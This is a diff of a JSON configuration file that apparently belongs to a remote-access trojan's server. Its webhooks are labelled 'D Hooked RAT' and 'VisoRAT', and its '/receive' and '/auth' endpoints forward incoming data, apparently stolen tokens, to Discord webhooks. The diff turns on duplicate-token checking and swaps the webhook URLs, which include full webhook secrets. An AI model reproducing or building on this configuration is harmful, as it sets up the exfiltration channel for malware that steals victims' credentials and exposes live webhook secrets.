@@ -2,13 +2,13 @@
     "security": {
         "rate_limit_seconds": 600,
         "min_token_length": 128,
-        "check_duplicate_tokens": false
+        "check_duplicate_tokens": true
     },
     "endpoints": {
         "/receive": {
             "webhooks": [
                 {
-                    "url": "https://discord.com/api/webhooks/1436062812181893220/we8vZVFgEATOld-gLGseWWbSx7n9L2HfY4yxjAfvz_bnJdZZ7o-9jVO4EVsHMZpvGrBp",
+                    "url": "https://discord.com/api/webhooks/1436062578815270992/HkVTtDWM7OIL4I7v6yDlt5EqkBCqOVHdzV5_Pcy0sFqW7oB059u3arkZ3iuHlxYfxgQp",
                     "name": "D Hooked RAT",
                     "footer": "VisoRAT",
                     "color": 7414964,
@@ -26,7 +26,7 @@
         "/auth": {
             "webhooks": [
                 {
-                    "url": "https://discord.com/api/webhooks/1436062578815270992/HkVTtDWM7OIL4I7v6yDlt5EqkBCqOVHdzV5_Pcy0sFqW7oB059u3arkZ3iuHlxYfxgQp",
+                    "url": "https://discord.com/api/webhooks/1435701023149920330/PuAXLpAJIc6EMe-Z4NUHHwCV_ou0sG4kY7rcKWVmVndu3qQqQxTk0VOIn1S4Cmi9rA77",
                     "name": "Not D Hooked RAT",
                     "footer": "VisoRAT",
                     "color": 7414964,
@@ -35,5 +35,7 @@
             ]
         }
     }
+
 }
+
 
